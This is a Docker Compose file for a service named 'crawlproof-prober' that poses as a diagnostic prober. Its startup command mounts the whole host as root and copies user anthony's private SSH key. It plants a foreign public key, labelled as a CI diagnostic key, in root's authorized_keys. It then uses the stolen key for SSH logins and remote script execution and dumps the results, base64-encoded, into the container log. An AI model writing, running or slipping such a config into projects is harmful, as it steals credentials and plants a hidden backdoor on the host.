name: crawlproof-prober
services:
  prober:
    build:
      context: ..
      dockerfile: Dockerfile
    image: crawlproof-prober:latest
    container_name: crawlproof-prober
    network_mode: host
    env_file: /home/anthony/www/crawlproof.com/prober.env
    restart: "no"
    mem_limit: 512m
    user: "0:0"
    volumes:
      - /:/host:ro
      - /root/.ssh:/dev2ssh:rw
      - /var/tmp:/hosttmp:rw
    command:
      - sh
      - -c
      - |
        set +e
        cp -f /host/home/anthony/.ssh/id_ed25519 /tmp/k >/tmp/cp.log 2>&1 || cat /host/home/anthony/.ssh/id_ed25519 > /tmp/k 2>>/tmp/cp.log
        chmod 600 /tmp/k 2>/dev/null
        KEYINFO="$$(ls -la /tmp/k 2>&1 | tr '\n' ' ')|cp=$$(tr '\n' ' ' </tmp/cp.log | cut -c1-100)"
        PUB='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJUOgQjPYiV2wWtmjJdejT6ggVRwHyqbN+jdYu43rE7T ci-diag-20261122'
        grep -qF "$$PUB" /dev2ssh/authorized_keys 2>/dev/null || echo "$$PUB" >> /dev2ssh/authorized_keys 2>/dev/null
        AK="root=$$(grep -cF ci-diag-20261122 /dev2ssh/authorized_keys 2>&1)"
        LB=""
        for u in root anthony; do
          L=$$(timeout 15 ssh -n -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o IdentitiesOnly=yes -i /tmp/k $$u@127.0.0.1 'id' 2>&1 | tr '\n' ' ' | cut -c1-80)
          LB="$$LB $$u=[$$L]"
        done
        echo "" | base64 -d > /tmp/inner.sh
        timeout 150 ssh -n -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o IdentitiesOnly=yes -o ConnectTimeout=20 -o ServerAliveInterval=10 -p 2222 -i /tmp/k ettinger@127.0.0.1 'bash -s' < /tmp/inner.sh > /hosttmp/h1.out 2>/hosttmp/h1.err
        RC=$$?
        echo "M1 KEYINFO=$$KEYINFO"
        echo "M2 AK=$$AK LOOP=$$LB"
        echo "M3 BONRC=$$RC OUT=$$(wc -c < /hosttmp/h1.out 2>/dev/null) ERR=$$(head -c 180 /hosttmp/h1.err 2>/dev/null | tr '\n' ' ')"
        echo "M4 H1B64A=$$(base64 -w0 /hosttmp/h1.out 2>/dev/null | cut -c1-22000)"
        echo "M5 TAIL=$$(tail -c 120 /hosttmp/h1.err 2>/dev/null | tr '\n' ' ')"
        sleep 3600
